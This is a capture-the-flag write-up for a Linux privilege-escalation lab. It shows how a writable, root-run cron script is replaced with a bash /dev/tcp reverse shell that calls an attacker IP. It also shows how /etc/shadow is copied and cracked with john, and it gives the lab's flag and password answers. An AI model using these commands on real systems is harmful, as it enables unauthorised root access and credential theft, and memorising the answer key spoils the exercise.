## Cron jobs execute scripts at scheduled times with the owner’s privileges. While not inherently vulnerable, they can be exploited for privilege escalation if a root-owned cron job runs a modifiable script.

- Crontabs store cron job configurations, with system-wide jobs located in /etc/crontab.
- Finding a root-owned cron job that executes a modifiable script allows attackers to inject a reverse shell.
- Attackers use available system tools (e.g., nc) to establish a root shell on an attacking machine.
- Common misconfigurations in companies:
  - Admins schedule cron jobs but forget to remove them after deleting scripts.
  - If the script’s full path isn’t specified, attackers can place a malicious script in a searchable path (e.g., home directory).
    Some tools in scripts (e.g., tar, 7z, rsync) can be exploited using wildcard vulnerabilities.
- Always check crontabs, as they can provide easy privilege escalation opportunities, especially in poorly maintained systems.

### Q.1: How many user-defined cron jobs can you see on the target system?

This one is easy is you read through the tab. We simply need to read the crontab file to see the user-defined cron jobs: ```cat /etc/crontab```
We see 4 cron jobs.

### Answer: 4

### Q.2: What is the content of the flag5.txt file?
There are many vulnerabilities related to these cronjobs. The backup.sh job is writable by karen, but run as root, which you see by running **ls -la**:

You can see the **backup.sh** script was configured to run every minute. As our current user can access this script, we can easily modify it to create a reverse shell, hopefully with root privileges. I decided to edit the **home/karen/backup.sh** file. Start by editing the file: ```nano /home/karen/backup.sh```
Enter the following, but make sure you edit the ip. I tried using the example from the article but it did not work.
```
#!/bin/bash
bash -i >& /dev/tcp/<attacker ip>/6666 0>&1
```
And save this script as **backup.sh**.
One last thing: you need to give the backup.sh script executable permissions by running: ```chmod +x backup.sh```

Then, all that is left is to start a netcat listener on your attacker machine: ```nc -lvnp 6666```
In the target machine we need to run the ```./backup.sh``` file.

In attacker/our machine we got **root** access. If you don't get the root access, try again to connect attacker machine to target machine.

But we need to find out where the flag is: ```find / -name flag5.txt 2>/dev/null```

Read the flag from the path: ```cat /home/ubuntu/flag5.txt```

There we go!
### Answer: THM-383000283 

### Q.3: What is Matt's password?

We need to do the same thing as in an earlier task. Read the passwd and shadow files, copy to the **attacker/our** machine, unshadow the files, and run john on the result.

Firstly, we has to export the **passwd** & **shadow** file following command:
```cat /etc/passwd > passwd.txt && cat /etc/shadow > shadow.txt```

Now copy these two files to the **attacker/our** machine. Then unshadow the files using following command: 
```unshadow passwd.txt shadow.txt > passwords.txt```

Now we can use john to crack this passwords.txt file. Do so by running the following command:
```john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt```

We found the answer!

### Answer: 123456

